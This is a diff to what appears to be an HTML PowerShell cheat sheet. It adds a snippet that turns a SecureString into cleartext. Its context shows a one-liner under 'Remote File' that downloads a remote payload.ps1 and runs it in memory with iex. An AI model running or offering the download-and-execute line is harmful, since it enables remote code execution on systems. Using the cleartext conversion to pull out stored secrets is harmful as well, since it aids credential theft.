@@ -189,6 +189,9 @@
 <p>Get file hash:</p>
 <div class="highlight"><pre><span></span><code>Get-FileHash -Algorithm md5
 </code></pre></div>
+<p>Convert SecureString to cleartext string:</p>
+<div class="highlight"><pre><span></span><code><span class="p">(</span><span class="nb">New-Object</span> <span class="n">PSCredential</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$secureString</span><span class="p">).</span><span class="n">GetNetworkCredential</span><span class="p">().</span><span class="n">Password</span>
+</code></pre></div>
 <h2 id="remote-file">Remote File</h2>
 <p>Download remote script and execute it in memory:</p>
 <div class="highlight"><pre><span></span><code><span class="nb">iex </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">'https://&lt;remote&gt;/payload.ps1'</span><span class="p">)</span>
